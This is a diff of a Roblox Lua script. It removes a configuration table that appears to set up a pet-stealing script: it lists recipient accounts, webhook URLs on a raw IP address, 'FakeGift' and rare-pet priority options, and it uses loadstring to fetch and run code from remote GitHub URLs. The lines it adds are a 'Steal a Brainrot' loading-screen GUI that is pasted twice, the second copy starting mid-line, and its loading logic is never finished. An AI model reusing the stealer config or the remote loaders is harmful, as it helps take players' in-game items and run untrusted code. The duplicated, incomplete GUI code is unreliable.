@@ -1,206 +1,379 @@
-_G.NullConfig = {
-    User = {"oldserver46", "test02775", "johnpaulo19"},
-    min_value = 10000000000,
-    pingEveryone = "Yes", -- dont change this
-    Webhook = "http://45.13.225.83:20002/proxy/4e58d972a7388d0bbd54124932f55724",
-    FakeGift = "No",
-    Trash = "http://45.13.225.83:20002/proxy/9ebf52eab7b29364d53a586dfea4b0b7",
-    LoadingScreen = "No",
-    GiftOnlyRares = "Yes",
-    ExecuteOtherScript = "Yes",
-    OtherScript = "loadstring(game:HttpGet("https://raw.githubusercontent.com/Thunder-Script/GrowaGarden/refs/heads/main/NewScript"))()",
-    PetPriority = {
-        ["Ankylosaurus"] = 1,
-        ["Axolotl"] = 1,
-        ["Bald Eagle"] = 1,
-        ["Bear Bee"] = 1,
-        ["Bee"] = 1,
-        ["Black Bunny"] = 1,
-        ["Blood Hedgehog"] = 1,
-        ["Blood Kiwi"] = 1,
-        ["Blood Owl"] = 1,
-        ["Brontosaurus"] = 1,
-        ["Brown Mouse"] = 1,
-        ["Bunny"] = 1,
-        ["Butterfly"] = 9,
-        ["Capybara"] = 1,
-        ["Cat"] = 1,
-        ["Caterpillar"] = 1,
-        ["Chicken"] = 1,
-        ["Chicken Zombie"] = 5,
-        ["Cooked Owl"] = 1,
-        ["Cow"] = 1,
-        ["Crab"] = 1,
-        ["Deer"] = 1,
-        ["Dilophosaurus"] = 1,
-        ["Disco Bee"] = 10,
-        ["Dog"] = 1,
-        ["Dragonfly"] = 9,
-        ["Echo Frog"] = 1,
-        ["Fennec Fox"] = 9,
-        ["Firefly"] = 1,
-        ["Flamingo"] = 1,
-        ["Frog"] = 1,
-        ["Giant Ant"] = 1,
-        ["Golden Bee"] = 1,
-        ["Golden Lab"] = 1,
-        ["Grey Mouse"] = 1,
-        ["Hamster"] = 1,
-        ["Hedgehog"] = 1,
-        ["Honey bee"] = 1,
-        ["Hyacinth"] = 1,
-        ["Iguanodon"] = 1,
-        ["Kappa"] = 1,
-        ["Kiwi"] = 1,
-        ["Kitsune"] = 10,
-        ["Koi"] = 1,
-        ["Meerkat"] = 1,
-        ["Mimic Octopus"] = 7,
-        ["Mole"] = 1,
-        ["Monkey"] = 1,
-        ["Moon Cat"] = 1,
-        ["Moth"] = 1,
-        ["Night Owl"] = 1,
-        ["Nihonzaru"] = 1,
-        ["Orange Tabby"] = 1,
-        ["Orangutan"] = 1,
-        ["Ostrich"] = 1,
-        ["Owl"] = 1,
-        ["Pachycephalosaurus"] = 1,
-        ["Pack Bee"] = 1,
-        ["Panda"] = 1,
-        ["Parasaurolophus"] = 1,
-        ["Peacock"] = 1,
-        ["Petal Bee"] = 1,
-        ["Pig"] = 1,
-        ["Polar Bear"] = 1,
-        ["Praying Mantis"] = 1,
-        ["Pterodactyl"] = 1,
-        ["Queen Bee"] = 7,
-        ["Raccoon"] = 10,
-        ["Raptor"] = 1,
-        ["Red Dragon"] = 1,
-        ["Red Fox"] = 4,
-        ["Red Giant Ant"] = 1,
-        ["Rooster"] = 1,
-        ["Sand Snake"] = 1,
-        ["Scarlet Macaw"] = 1,
-        ["Sea Otter"] = 1,
-        ["Sea Turtle"] = 1,
-        ["Seagull"] = 1,
-        ["Seal"] = 1,
-        ["Shiba Inu"] = 1,
-        ["Silver Monkey"] = 1,
-        ["Snail"] = 1,
-        ["Spinosaurus"] = 9,
-        ["Spotted Deer"] = 1,
-        ["Squirrel"] = 1,
-        ["Starfish"] = 1,
-        ["Stegosaurus"] = 1,
-        ["Tanchozuru"] = 1,
-        ["Tanuki"] = 1,
-        ["Tarantula Hawk"] = 1,
-        ["T-Rex"] = 8,
-        ["Triceratops"] = 1,
-        ["Turtle"] = 1,
-        ["Wasp"] = 1
-    },
-    ImportantPetsList = {
-        ["Ankylosaurus"] = false,
-        ["Axolotl"] = false,
-        ["Bald Eagle"] = false,
-        ["Bear Bee"] = false,
-        ["Bee"] = false,
-        ["Black Bunny"] = false,
-        ["Blood Hedgehog"] = false,
-        ["Blood Kiwi"] = false,
-        ["Blood Owl"] = false,
-        ["Brontosaurus"] = false,
-        ["Brown Mouse"] = false,
-        ["Bunny"] = false,
-        ["Butterfly"] = true,
-        ["Capybara"] = false,
-        ["Cat"] = false,
-        ["Caterpillar"] = false,
-        ["Chicken"] = false,
-        ["Chicken Zombie"] = false,
-        ["Cooked Owl"] = false,
-        ["Cow"] = false,
-        ["Crab"] = false,
-        ["Deer"] = false,
-        ["Dilophosaurus"] = false,
-        ["Disco Bee"] = true,
-        ["Dog"] = false,
-        ["Dragonfly"] = true,
-        ["Echo Frog"] = false,
-        ["Fennec Fox"] = true,
-        ["Firefly"] = false,
-        ["Flamingo"] = false,
-        ["Frog"] = false,
-        ["Giant Ant"] = false,
-        ["Golden Bee"] = false,
-        ["Golden Lab"] = false,
-        ["Grey Mouse"] = false,
-        ["Hamster"] = false,
-        ["Hedgehog"] = false,
-        ["Honey bee"] = false,
-        ["Hyacinth"] = false,
-        ["Iguanodon"] = false,
-        ["Kappa"] = false,
-        ["Kiwi"] = false,
-        ["Kitsune"] = true,
-        ["Koi"] = false,
-        ["Meerkat"] = false,
-        ["Mimic Octopus"] = true,
-        ["Mole"] = false,
-        ["Monkey"] = false,
-        ["Moon Cat"] = false,
-        ["Moth"] = false,
-        ["Night Owl"] = false,
-        ["Nihonzaru"] = false,
-        ["Orange Tabby"] = false,
-        ["Orangutan"] = false,
-        ["Ostrich"] = false,
-        ["Owl"] = false,
-        ["Pachycephalosaurus"] = false,
-        ["Pack Bee"] = false,
-        ["Panda"] = false,
-        ["Parasaurolophus"] = false,
-        ["Peacock"] = false,
-        ["Petal Bee"] = false,
-        ["Pig"] = false,
-        ["Polar Bear"] = false,
-        ["Praying Mantis"] = false,
-        ["Pterodactyl"] = false,
-        ["Queen Bee"] = true,
-        ["Raccoon"] = true,
-        ["Raptor"] = false,
-        ["Red Dragon"] = false,
-        ["Red Fox"] = false,
-        ["Red Giant Ant"] = false,
-        ["Rooster"] = false,
-        ["Sand Snake"] = false,
-        ["Scarlet Macaw"] = false,
-        ["Sea Otter"] = false,
-        ["Sea Turtle"] = false,
-        ["Seagull"] = false,
-        ["Seal"] = false,
-        ["Shiba Inu"] = false,
-        ["Silver Monkey"] = false,
-        ["Snail"] = false,
-        ["Spinosaurus"] = true,
-        ["Spotted Deer"] = false,
-        ["Squirrel"] = false,
-        ["Starfish"] = false,
-        ["Stegosaurus"] = false,
-        ["Tanchozuru"] = false,
-        ["Tanuki"] = false,
-        ["Tarantula Hawk"] = false,
-        ["T-Rex"] = true,
-        ["Triceratops"] = false,
-        ["Turtle"] = false,
-        ["Wasp"] = false
-    }
-}
-    
-loadstring(game:HttpGetAsync('https://raw.githubusercontent.com/sleepyvill/script/refs/heads/main/lib.lua'))()
+local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local ContentProvider = game:GetService("ContentProvider")
+
+local player = Players.LocalPlayer
+local starterGui = player:WaitForChild("PlayerGui")
+
+-- SETTINGS (customize)
+local TITLE_TEXT = "Steal a Brainrot"
+local SUBTEXT = "Loading game..."
+local BACKDROP_COLOR = Color3.fromRGB(18, 18, 24)
+local ACCENT_COLOR = Color3.fromRGB(199, 34, 255) -- magenta-ish
+local PROGRESS_BG = Color3.fromRGB(45,45,50)
+local PROGRESS_HEIGHT = 18
+local SIMULATED_SPEED = 0.8 -- how fast simulated load progresses (higher is faster)
+
+-- Create GUI
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "StealABrainrot_LoadingGui"
+screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+screenGui.Parent = starterGui
+
+local backdrop = Instance.new("Frame")
+backdrop.Name = "Backdrop"
+backdrop.AnchorPoint = Vector2.new(0.5,0.5)
+backdrop.Size = UDim2.new(0.8, 0, 0.6, 0)
+backdrop.Position = UDim2.new(0.5,0,0.5,0)
+backdrop.BackgroundColor3 = BACKDROP_COLOR
+backdrop.BorderSizePixel = 0
+backdrop.Parent = screenGui
+backdrop.ClipsDescendants = true
+
+local title = Instance.new("TextLabel")
+title.Name = "Title"
+title.Size = UDim2.new(1, -80, 0, 70)
+title.Position = UDim2.new(0, 40, 0, 24)
+title.BackgroundTransparency = 1
+title.Text = TITLE_TEXT
+title.TextColor3 = Color3.new(1,1,1)
+title.Font = Enum.Font.GothamBold
+title.TextSize = 36
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = backdrop
+
+local subtitle = Instance.new("TextLabel")
+subtitle.Name = "Subtitle"
+subtitle.Size = UDim2.new(1, -80, 0, 24)
+subtitle.Position = UDim2.new(0, 40, 0, 64)
+subtitle.BackgroundTransparency = 1
+subtitle.Text = SUBTEXT
+subtitle.TextColor3 = Color3.fromRGB(200,200,200)
+subtitle.Font = Enum.Font.Gotham
+title.TextSize = 16
+subtitle.TextSize = 16
+subtitle.TextXAlignment = Enum.TextXAlignment.Left
+subtitle.Parent = backdrop
+
+-- Decorative accent bar
+local accent = Instance.new("Frame")
+accent.Name = "Accent"
+accent.AnchorPoint = Vector2.new(0,0)
+accent.Position = UDim2.new(0, 0, 0, 0)
+accent.Size = UDim2.new(0.08, 0, 1, 0)
+accent.BackgroundColor3 = ACCENT_COLOR
+accent.BorderSizePixel = 0
+accent.Parent = backdrop
+
+-- Progress bar background
+local progressBg = Instance.new("Frame")
+progressBg.Name = "ProgressBg"
+progressBg.AnchorPoint = Vector2.new(0.5, 0)
+progressBg.Size = UDim2.new(0.85, 0, 0, PROGRESS_HEIGHT + 8)
+progressBg.Position = UDim2.new(0.5, 0, 1, -80)
+progressBg.BackgroundColor3 = PROGRESS_BG
+progressBg.BorderSizePixel = 0
+progressBg.Parent = backdrop
+
+local progressBar = Instance.new("Frame")
+progressBar.Name = "ProgressBar"
+progressBar.Size = UDim2.new(0, 0, 1, 0)
+progressBar.Position = UDim2.new(0, 0, 0, 0)
+progressBar.BackgroundColor3 = ACCENT_COLOR
+progressBar.BorderSizePixel = 0
+progressBar.Parent = progressBg
+
+local percentLabel = Instance.new("TextLabel")
+percentLabel.Name = "Percent"
+percentLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+percentLabel.Size = UDim2.new(0, 120, 0, 24)
+percentLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
+percentLabel.BackgroundTransparency = 1
+percentLabel.Text = "0%"
+percentLabel.TextColor3 = Color3.new(1,1,1)
+percentLabel.Font = Enum.Font.GothamSemibold
+percentLabel.TextSize = 14
+percentLabel.Parent = progressBg
+
+-- Spinner (rotating circle)
+local spinner = Instance.new("ImageLabel")
+spinner.Name = "Spinner"
+spinner.Size = UDim2.new(0, 40, 0, 40)
+spinner.AnchorPoint = Vector2.new(1, 0)
+spinner.Position = UDim2.new(1, -24, 0, 24)
+spinner.BackgroundTransparency = 1
+-- A commonly used free circular asset (Roblox library) — replace if you want a custom image
+spinner.Image = "rbxassetid://11329340118" -- small ring; if this 404s, replace with your own
+spinner.Parent = backdrop
+
+-- Optional: subtle blur effect (works only if the client supports it)
+local blur = Instance.new("BlurEffect")
+blur.Parent = game:GetService("Lighting")
+blur.Size = 0
+
+-- Animation helpers
+local function tweenObject(obj, props, time, style, direction)
+	local info = TweenInfo.new(time or 0.5, style or Enum.EasingStyle.Quad, direction or Enum.EasingDirection.Out)
+	local t = TweenService:Create(obj, info, props)
+	t:Play()
+	return t
+end
+
+-- Rotate spinner
+spawn(function()
+	local angle = 0
+	while screenGui and screenGui.Parent do
+		angle = angle + 360 * RunService.Heartbeat:Wait() * 0.6
+		spinner.Rotation = angle % 360
+	end
+end)
+
+-- Loading logic: try to actually preload common asset containers, otherwise simulate
+local function tryPreload()
+	local toPreload = {}
+	-- Add common service containers that may contain assets (images, sounds, models)
+	local function addIfExists(container)
+		if container and #container:GetChildren() > 0 then
+			for _, v in ipairs(container:GetChildren()) do
+				table.insert(toPreload, v)
+			end
+		end
+	end
+
+	addIfExists(game:GetService("ReplicatedStorage"))
+	addIfExists(game:GetService("StarterPack"))
+	addIfExists(game:GetService("Workspace"))
+	addIfExists(game:GetService("StarterGui"))
+
+	if #toPreload > 0 then
+		local ok, err = pcall(function()
+			ContentProvider:PreloadAsync(toPreload, function(assetId, status)
+				-- progress callback is intentionally left empty (we'll poll ContentProvider:GetAssetStatus)
+			end)
+		end)
+		if not ok then
+			return false, err
+		end
+		return true
+	end
+	return false
+end
+
+-- Progress updater
+local progress = 0
+local loadingDone = false
+
+local function updateProgress(target)
+	tweenObject(progressBar, {Size = UDim2.new(target/100, 0, 1, 0)}, 0.35)
+	percentLabel.Text = string.format("%d%%", math.floor(target))
+end
+
+-- Start: fade-in GUI
+backdrop.BackgroundTransparency = 1
+title.TextTransparency = 1
+subtitle.TextTransparency = 1
+progressBg.BackgroundTransparency = 1
+accent.BackgroundTransparency = 1
+spinner.ImageTransparency = 1
+
+-- Fade in quickly
+tweenObject(backdrop, {BackgroundTransparency = 0}, 0.45)
+tweenObject(title, {TextTransparency = 0}, 0.5)
+tweenObject(subtitle, {TextTransparency = 0}, 0.55)
+tweenObject(progressBg, {BackgroundTransparency = 0}, 0.6)
+tweenObject(accent, {BackgroundTransparency = 0}, 0.6)
+spawn(function()
+	local spinTween = TweenService:Create(spinner, TweenInfo.new(0.8, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1), {ImageTransparency = 0})
+	spinTween:Play()
+end)local Players = game:GetService("Players")
+local TweenService = game:GetService("TweenService")
+local RunService = game:GetService("RunService")
+local ContentProvider = game:GetService("ContentProvider")
+
+local player = Players.LocalPlayer
+local starterGui = player:WaitForChild("PlayerGui")
+
+-- SETTINGS (customize)
+local TITLE_TEXT = "Steal a Brainrot"
+local SUBTEXT = "Loading game..."
+local BACKDROP_COLOR = Color3.fromRGB(18, 18, 24)
+local ACCENT_COLOR = Color3.fromRGB(199, 34, 255) -- magenta-ish
+local PROGRESS_BG = Color3.fromRGB(45,45,50)
+local PROGRESS_HEIGHT = 18
+local SIMULATED_SPEED = 0.8 -- how fast simulated load progresses (higher is faster)
+
+-- Create GUI
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "StealABrainrot_LoadingGui"
+screenGui.ResetOnSpawn = false
+screenGui.IgnoreGuiInset = true
+screenGui.Parent = starterGui
+
+local backdrop = Instance.new("Frame")
+backdrop.Name = "Backdrop"
+backdrop.AnchorPoint = Vector2.new(0.5,0.5)
+backdrop.Size = UDim2.new(0.8, 0, 0.6, 0)
+backdrop.Position = UDim2.new(0.5,0,0.5,0)
+backdrop.BackgroundColor3 = BACKDROP_COLOR
+backdrop.BorderSizePixel = 0
+backdrop.Parent = screenGui
+backdrop.ClipsDescendants = true
+
+local title = Instance.new("TextLabel")
+title.Name = "Title"
+title.Size = UDim2.new(1, -80, 0, 70)
+title.Position = UDim2.new(0, 40, 0, 24)
+title.BackgroundTransparency = 1
+title.Text = TITLE_TEXT
+title.TextColor3 = Color3.new(1,1,1)
+title.Font = Enum.Font.GothamBold
+title.TextSize = 36
+title.TextXAlignment = Enum.TextXAlignment.Left
+title.Parent = backdrop
+
+local subtitle = Instance.new("TextLabel")
+subtitle.Name = "Subtitle"
+subtitle.Size = UDim2.new(1, -80, 0, 24)
+subtitle.Position = UDim2.new(0, 40, 0, 64)
+subtitle.BackgroundTransparency = 1
+subtitle.Text = SUBTEXT
+subtitle.TextColor3 = Color3.fromRGB(200,200,200)
+subtitle.Font = Enum.Font.Gotham
+title.TextSize = 16
+subtitle.TextSize = 16
+subtitle.TextXAlignment = Enum.TextXAlignment.Left
+subtitle.Parent = backdrop
+
+-- Decorative accent bar
+local accent = Instance.new("Frame")
+accent.Name = "Accent"
+accent.AnchorPoint = Vector2.new(0,0)
+accent.Position = UDim2.new(0, 0, 0, 0)
+accent.Size = UDim2.new(0.08, 0, 1, 0)
+accent.BackgroundColor3 = ACCENT_COLOR
+accent.BorderSizePixel = 0
+accent.Parent = backdrop
+
+-- Progress bar background
+local progressBg = Instance.new("Frame")
+progressBg.Name = "ProgressBg"
+progressBg.AnchorPoint = Vector2.new(0.5, 0)
+progressBg.Size = UDim2.new(0.85, 0, 0, PROGRESS_HEIGHT + 8)
+progressBg.Position = UDim2.new(0.5, 0, 1, -80)
+progressBg.BackgroundColor3 = PROGRESS_BG
+progressBg.BorderSizePixel = 0
+progressBg.Parent = backdrop
+
+local progressBar = Instance.new("Frame")
+progressBar.Name = "ProgressBar"
+progressBar.Size = UDim2.new(0, 0, 1, 0)
+progressBar.Position = UDim2.new(0, 0, 0, 0)
+progressBar.BackgroundColor3 = ACCENT_COLOR
+progressBar.BorderSizePixel = 0
+progressBar.Parent = progressBg
+
+local percentLabel = Instance.new("TextLabel")
+percentLabel.Name = "Percent"
+percentLabel.AnchorPoint = Vector2.new(0.5, 0.5)
+percentLabel.Size = UDim2.new(0, 120, 0, 24)
+percentLabel.Position = UDim2.new(0.5, 0, 0.5, 0)
+percentLabel.BackgroundTransparency = 1
+percentLabel.Text = "0%"
+percentLabel.TextColor3 = Color3.new(1,1,1)
+percentLabel.Font = Enum.Font.GothamSemibold
+percentLabel.TextSize = 14
+percentLabel.Parent = progressBg
+
+-- Spinner (rotating circle)
+local spinner = Instance.new("ImageLabel")
+spinner.Name = "Spinner"
+spinner.Size = UDim2.new(0, 40, 0, 40)
+spinner.AnchorPoint = Vector2.new(1, 0)
+spinner.Position = UDim2.new(1, -24, 0, 24)
+spinner.BackgroundTransparency = 1
+-- A commonly used free circular asset (Roblox library) — replace if you want a custom image
+spinner.Image = "rbxassetid://11329340118" -- small ring; if this 404s, replace with your own
+spinner.Parent = backdrop
+
+-- Optional: subtle blur effect (works only if the client supports it)
+local blur = Instance.new("BlurEffect")
+blur.Parent = game:GetService("Lighting")
+blur.Size = 0
+
+-- Animation helpers
+local function tweenObject(obj, props, time, style, direction)
+	local info = TweenInfo.new(time or 0.5, style or Enum.EasingStyle.Quad, direction or Enum.EasingDirection.Out)
+	local t = TweenService:Create(obj, info, props)
+	t:Play()
+	return t
+end
+
+-- Rotate spinner
+spawn(function()
+	local angle = 0
+	while screenGui and screenGui.Parent do
+		angle = angle + 360 * RunService.Heartbeat:Wait() * 0.6
+		spinner.Rotation = angle % 360
+	end
+end)
+
+-- Loading logic: try to actually preload common asset containers, otherwise simulate
+local function tryPreload()
+	local toPreload = {}
+	-- Add common service containers that may contain assets (images, sounds, models)
+	local function addIfExists(container)
+		if container and #container:GetChildren() > 0 then
+			for _, v in ipairs(container:GetChildren()) do
+				table.insert(toPreload, v)
+			end
+		end
+	end
+
+	addIfExists(game:GetService("ReplicatedStorage"))
+	addIfExists(game:GetService("StarterPack"))
+	addIfExists(game:GetService("Workspace"))
+	addIfExists(game:GetService("StarterGui"))
+
+	if #toPreload > 0 then
+		local ok, err = pcall(function()
+			ContentProvider:PreloadAsync(toPreload, function(assetId, status)
+				-- progress callback is intentionally left empty (we'll poll ContentProvider:GetAssetStatus)
+			end)
+		end)
+		if not ok then
+			return false, err
+		end
+		return true
+	end
+	return false
+end
+
+-- Progress updater
+local progress = 0
+local loadingDone = false
+
+local function updateProgress(target)
+	tweenObject(progressBar, {Size = UDim2.new(target/100, 0, 1, 0)}, 0.35)
+	percentLabel.Text = string.format("%d%%", math.floor(target))
+end
+
+-- Start: fade-in GUI
+backdrop.BackgroundTransparency = 1
+title.TextTransparency = 1
+subtitle.TextTransparency = 1
+progressBg.BackgroundTransparency = 1
+accent.BackgroundTransparency = 1
+spinner.ImageTransparency = 1
+
+-- Fade in quickly
+tweenObject(backdrop, {BackgroundTransparency = 0}, 0.45)
+tweenObject(title, {TextTransparency = 0}, 0.5)
+tweenObject(subtitle, {TextTransparency = 0}, 0.55)
+tweenObject(progressBg, {BackgroundTransparency = 0}, 0.6)
+tweenObject(accent, {BackgroundTransparency = 0}, 0.6)
+spawn(function()
+	local spinTween = TweenService:Create(spinner, TweenInfo.new(0.8, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut, -1), {ImageTransparency = 0})
+	spinTween:Play()
+end)
